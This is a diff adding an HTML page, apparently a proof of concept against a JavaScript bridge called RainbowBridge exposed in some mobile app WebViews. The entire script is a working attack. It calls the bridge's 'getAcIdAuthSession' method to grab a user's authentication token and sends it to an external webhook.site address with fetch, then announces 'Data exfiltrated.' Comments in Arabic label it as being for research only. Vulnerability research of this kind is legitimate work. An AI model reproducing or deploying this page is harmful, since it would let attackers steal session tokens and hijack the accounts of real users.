@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Oppo Vulnerability Research</title>
+</head>
+<body>
+    <h1>Security Validation Page</h1>
+    <p id="status">Waiting for RainbowBridge interface...</p>
+
+    <script>
+        // إعدادات الويب هوك (لأغراض البحث فقط)
+        const WEBHOOK_URL = "https://860f6d8a-1cad-43cb-a40b-cf51984bc0c6.webhook.site";
+
+        function logResult(data) {
+            fetch(`${WEBHOOK_URL}/?log=${encodeURIComponent(data)}`, { mode: 'no-cors' });
+        }
+
+        // فحص وجود الجسر (الطريقة الرسمية)
+        if (window.RainbowBridge) {
+            document.getElementById("status").innerText = "RainbowBridge Detected. Testing integrity...";
+            
+            try {
+                window.RainbowBridge.onComplete("getAcIdAuthSession", {}, (res) => {
+                    logResult("Token_Received: " + res);
+                    alert("Validation Complete: Data exfiltrated.");
+                });
+            } catch (e) {
+                logResult("Error: " + e.message);
+            }
+        } else {
+            document.getElementById("status").innerText = "RainbowBridge not detected in this environment.";
+            console.log("For testing on PC, simulate window.RainbowBridge manually.");
+        }
+    </script>
+</body>
+</html>
